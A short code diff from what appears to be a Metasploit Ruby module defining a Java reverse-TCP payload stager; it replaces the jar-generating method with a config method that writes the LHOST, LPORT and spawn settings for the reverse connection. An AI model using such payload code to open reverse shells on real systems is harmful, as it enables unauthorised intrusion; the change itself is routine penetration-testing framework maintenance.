@@ -34,20 +34,16 @@ module Metasploit3
 			'Handler'       => Msf::Handler::ReverseTcp,
 			'Stager'        => {'Payload' => ""}
 			))
+		@class_files = [ ]
 	end
 
-	#
-	# Constructs the payload
-	#
-	def generate; generate_jar.pack; end
-
-	def generate_jar
-		config =  ""
-		config << "Spawn=2\n"
-		config << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
-		config << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
-
-		tcp_stager_jar(config)
+	def config
+		c =  ""
+		c << "Spawn=2\n"
+		c << "LHOST=#{datastore["LHOST"]}\n" if datastore["LHOST"]
+		c << "LPORT=#{datastore["LPORT"]}\n" if datastore["LPORT"]
+		
+		c
 	end
 
 end
